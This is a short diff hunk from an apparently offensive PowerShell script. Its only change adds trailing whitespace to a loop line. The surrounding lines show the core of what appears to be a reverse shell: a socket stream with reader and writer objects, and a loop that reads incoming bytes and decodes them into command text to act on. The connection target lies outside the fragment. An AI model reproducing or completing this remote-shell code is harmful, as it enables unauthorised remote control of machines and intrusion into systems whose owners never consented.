@@ -5,7 +5,7 @@ $R = New-Object "IO.StreamReader"($S);
 $W = New-Object "IO.StreamWriter"($S);
 $W.AutoFlush = $true;
 $B = New-Object "Byte[]" 1024;
-while($T.Connected){
+while($T.Connected){ 
     while($S.DataAvailable){
         $RD = $S.Read($B,0,$B.Length);
         $C = ([Text.Encoding]::UTF8).GetString($B,0,$RD-1)
